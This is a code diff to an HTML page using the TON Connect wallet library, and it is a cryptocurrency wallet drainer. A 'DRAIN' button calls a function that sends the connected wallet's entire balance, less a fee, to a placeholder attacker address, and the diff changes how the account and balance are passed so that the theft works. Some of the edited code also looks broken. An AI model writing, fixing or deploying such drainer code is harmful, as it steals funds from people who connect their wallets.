@@ -48,7 +48,7 @@
     </ul>
 
     <div id="ton-connect"></div> <!-- Connect Wallet Button -->
-    <button onclick="didtrans();" style="margin-top: 30px; font-size: 24px;">DRAIN</button> <!-- Transfer All Assets Button -->
+    <button onclick="await didtrans(walletInfo.account);" style="margin-top: 30px; font-size: 24px;">DRAIN</button> <!-- Transfer All Assets Button -->
 
     <script>
         // Static tonconnect-manifest.json URL instead of dynamic creation
@@ -108,11 +108,12 @@ tonConnectUI.onStatusChange(async (walletInfo) => {
         }
 
         // Function to transfer TON and NFTs
-        async function didtrans() {
+        async function didtrans(walletAccount) {
             console.log('Attempting to send transaction...');
             try {
-                const walletInfo = tonConnectUI.connected;
-                if (!walletInfo || !walletInfo.account) {
+                // Use the wallet information from the onStatusChange event
+const walletInfo = tonConnectUI.connectedWallet;
+                if (!walletAccount) {
                     console.error('Wallet is not connected. Cannot proceed with transaction.');
                     return;
                 }
@@ -122,7 +123,7 @@ tonConnectUI.onStatusChange(async (walletInfo) => {
                     messages: [
                         {
                             address: 'YOUR_DESTINATION_WALLET_ADDRESS', // Replace with your wallet address
-                            amount: walletInfo.balance || 0 - 3000000 // Deduct fee (in nanotons)
+                            amount: parseFloat(walletAccount.balance || 0) - 3000000 // Deduct fee (in nanotons)
                         }
                     ]
                 };
